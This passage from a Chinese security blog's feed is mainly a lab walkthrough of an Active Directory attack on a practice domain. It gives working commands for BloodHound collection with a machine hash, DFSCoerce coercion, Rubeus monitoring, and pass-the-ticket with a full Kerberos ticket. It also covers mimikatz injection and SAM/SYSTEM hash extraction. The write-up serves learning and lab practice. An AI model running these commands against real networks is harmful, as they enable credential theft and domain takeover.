class="line">4</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 bloodhound-python -u win19$ --hashes &quot;aad3b435b51404eeaad3b435b51404ee:544cd3307615b72c370b3fea4d76fb65&quot; -d xiaorang.lab -dc dc01.xiaorang.lab -c all --dns-tcp -ns 172.22.4.7 --auth-method ntlm --zip</span><br><span class="line"></span><br><span class="line">//这个方法很骚  不用上传sharphound就能获取到这个压缩包  只需要获取到一个域账户的密码或者has</span><br><span class="line">//这里用的hash值是机器的hash值  因为只有机器在域内</span><br></pre></td></tr></table></figure><p><img src="../images/image-20231010205618301.png" alt="image-20231010205618301"></p><p><img src="../images/image-20231010211757396.png" alt="image-20231010211757396"></p><p><a href="https://forum.butian.net/share/1944">https://forum.butian.net/share/1944</a>  这篇文章写的很好  几乎总结了非约束委派的攻击</p><p><strong>简洁点说就是强制域控向目标主机发起身份验证  由于开启了非约束委派  就能获取到域控的TGT票据</strong></p><p>先使用<strong>本地管理员</strong>运行<code>Rubeus.exe</code>   并且监听   <strong>(需要管理员权限)</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Rubeus.exe monitor /interval:1 /nowrap /targetuser:DC01$</span><br></pre></td></tr></table></figure><p>使用 DFSCoerce 漏洞利用工具，触发辅域控进行强制验证</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 python3 dfscoerce.py -u win19$ -hashes &quot;aad3b435b51404eeaad3b435b51404ee:544cd3307615b72c370b3fea4d76fb65&quot; -d xiaorang.lab win19 172.22.4.7</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">//这里用的hash值是机器的hash值</span><br></pre></td></tr></table></figure><p><img src="../images/image-20231010210557409.png" alt="image-20231010210557409"></p><p>然后ptt注入到内存中</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Rubeus.exe ptt /ticket:doIFlDCCBZCgAwIBBaEDAgEWooIEnDCCBJhhggSUMIIEkKADAgEFoQ4bDFhJQU9SQU5HLkxBQqIhMB+gAwIBAqEYMBYbBmtyYnRndBsMWElBT1JBTkcuTEFCo4IEVDCCBFCgAwIBEqEDAgECooIEQgSCBD6wZL58oV7f7zZFBrMFkbAa5M+OSIALaywU/VrSxKEOb1HHvPzIbGEW7LMmPRNsZ7v/GB2EMhZ5HySrR/OYXvVwL6SwetfRB4FKQtwxqt9q46DGDzv0Nvu4Vgaq8i6vkO6T9qv+7yOhDUVkNU15LrEmn5x2fNpzdayhLLbmcER61oyplHwnRjohA6hTJzPOFZ2lqb5o7ComIWVn75vlEYD7VrVxvEvzHKVXi+vszYu2pIpjDqG+ypB4ekRoEKLkAm5V0mnhBfwVgNXxD6fJPw7yTsCi5GFRHwwblNmxCKccYyAUa9TSO4ep2UZWvL6ZNfy7FjlgAhIhzpbwqbcyFB02IFqvXK8ii7yn/Wl/ybI0lQkDeqt2XoLhTkOIcn+AEYG+DBiGyPHX1f856QLFS0iRP3wn70JK1br505QCqRt+C9+lLQP8vwQxgsWvcr1lJlEtblOPNl0J4F+QLfKkFYZVVTjs9K7ZOMA2jnTC6MI0PnL1Dq2iDXcYxRZX5IUjkNFzC38pwgl8ENSE87BjMUEfJcrSLv5mR88PbI2/ZEbva9geW483mMMMoBvgsX03zCWto4dUEnfNIxPYpd+lJfMPCAwhMrOJTIYIlOI9D9iCcL1+y3NSf4G7u3MiXXozX3q9LmpYw5KtZA3HdPL4oQ2b5fwSzGj7+x6VaqAvksfLRCU4uwT70kzd05l4L45LHlPao208057PvtEoN5ulakfctRytd6ql3GLWAbx6euNL905niHadPAQoYQA5Y8XiNTvOXU7bmA5dNnXHr/PgrJ2ruG5RIea52HbwLcuAZD28F+pS75bp1j5/wbKUybM/rpEqhNC5kcp7dRqMonbZpmahCbs23rskOr10ApUWEn3r2vPIcVZHRv7Hg/ddellNO9jTHbofARWm0QokiET4pDzb88yaHv50njhkIwBDtM/dvq+ct+qgfDAPKawnLPrUJQD7N1SbFOSWhe2yZKgBi5H4+HYq+R2RZnIApBk9o+n46fKus/z30rRcVPzlw+UyMrhBWO1sQKoPnpmXU6HF5x7TDQTV9mmz662O/PBSTXNrmhrl3kGM7aGazXdS6kvw0efrr+q1sLbIOB0NK1FCG7jaiHA64CSAc2wfv5RdvLbyynfj5xd6EQ6MEPG8uksKAZmQfQBYbDX6VEo3AbOarRFU64fcofmM4bim+mC8zRDO5u6IRzzumKJY5RQBVu8/ariYxmoKO3NATVUG4LD5bGAt3VxvxqZLB8znObSSPV2vpxQgXza1JI/Ka73c8Qjac0GrnFgKaUqX+Qz7f7GpOQW+MrxOCtiMz8h3rcE+DakoD87wVdLUwxVSkm4nCC38ncACTWcNK6LA+JXHl/gEyHKbkIetS43uPyl1EcBFevBgVaqx7UDYBgPftUb3T5QsBAtESt45UFgwgVsSk24OOO6MuR2ZwsvII6Lh4aEWPhujgeMwgeCgAwIBAKKB2ASB1X2B0jCBz6CBzDCByTCBxqArMCmgAwIBEqEiBCAMuVQ3Nb40HrUocO728XSfvrrukgPxsxytwOi4m+NCqaEOGwxYSUFPUkFORy5MQUKiEjAQoAMCAQGhCTAHGwVEQzAxJKMHAwUAYKEAAKURGA8yMDIzMTAxMDExMjIwM1qmERgPMjAyMzEwMTAyMTIyMDNapxEYDzIwMjMxMDE3MTEyMjAzWqgOGwxYSUFPUkFORy5MQUKpITAfoAMCAQKhGDAWGwZrcmJ0Z3QbDFhJQU9SQU5HLkxBQg==</span><br></pre></td></tr></table></figure><p><img src="../images/image-20231010210812205.png" alt="image-20231010210812205"></p><p><code>echo &#39;base64xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx&#39; | base64 -d &gt; DC01.kirbi</code></p><p>这里话也可以将base解码然后存入<code>DC01.kirbi</code>   <strong>(主要是这个后缀  名字无所谓)</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe &quot;kerberos::purge&quot; &quot;kerberos::ptt DC01.kirbi&quot;</span><br></pre></td></tr></table></figure><p>当然了  也可以转发为cache导入  这三个是可以互相转化的</p><p>注入票据成功  然后开始dyscn导出域控hash值进行  pth攻击</p><p><img src="../images/image-20231010210950030.png" alt="image-20231010210950030"></p><p><img src="../images/image-20231010211412842.png" alt="image-20231010211412842"></p><p>做题的时候写了点东西</p><blockquote><p>system(机器账户)  是机器账户固有的权限</p><p>administrator(本地管理员账户)  拥有的是别的权限 不是system权限</p><p>这个两个账户是不同的  在这个域中的话  使用hashdump  或者是meterpreter的load kiwi 的creds_all获取的只有这个计算机内的用户的hash值  获取不到这个机器账户的hash值  能获取到的话只有这个注册表里的sam system  security  通过脚本爆破的话是可以爆破出这个机器账户的hash值 (python3 secretsdump.py LOCAL -system system -sam sam -security security)</p><p>当然了 一般除了system和admin用户外  一般人下载不到这三个注册表里的东西 (提权用的东西除外)</p><p>还有一点就是本地普通用户的话 执行 net user /domain  的话  是会报错的<br>WIN\xxx  这种用户名的一般是本地用户</p><p>域用户的话一般是—————》  xxxx@domain</p><p>可能存在的一种情况就是机器是域内账户  其他是本地账户  如果要想执行别的操作的话  大多数情况下是得要域内账户</p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;fscan开扫&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;../images/image-20231010192348417.png&quot; alt=&quot;image-20231010192348417&quot;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;../images/image-202310101</summary>
      
    
    
    
    
    <category term="内网" scheme="https://ke1nys.github.io/tags/%E5%86%85%E7%BD%91/"/>
    
  </entry>
  
  <entry>
    <title>域渗透-注册表漏洞利用</title>
    <link href="https://ke1nys.github.io/posts/27821cfa.html"/>
    <id>https://ke1nys.github.io/posts/27821cfa.html</id>
    <published>2023-10-10T03:10:38.000Z</published>
    <updated>2023-10-20T14:12:45.766Z</updated>
    
    <content type="html"><![CDATA[<p>先占个坑  以后深入学习了 后面再写</p><p><a href="https://www.freebuf.com/articles/es/214551.html">https://www.freebuf.com/articles/es/214551.html</a></p><p><a href="https://www.cnblogs.com/Mikasa-Ackerman/p/Windows-zhu-ce-biao-de-xue-xi.html">https://www.cnblogs.com/Mikasa-Ackerman/p/Windows-zhu-ce-biao-de-xue-xi.html</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;先占个坑  以后深入学习了 后面再写&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://www.freebuf.com/articles/es/214551.html&quot;&gt;https://www.freebuf.com/articles/es/214551.html&lt;/a&gt;&lt;/</summary>
      
    
    
    
    
    <category term="内网" scheme="https://ke1nys.github.io/tags/%E5%86%85%E7%BD%91/"/>
    
  </entry>
  
</feed>
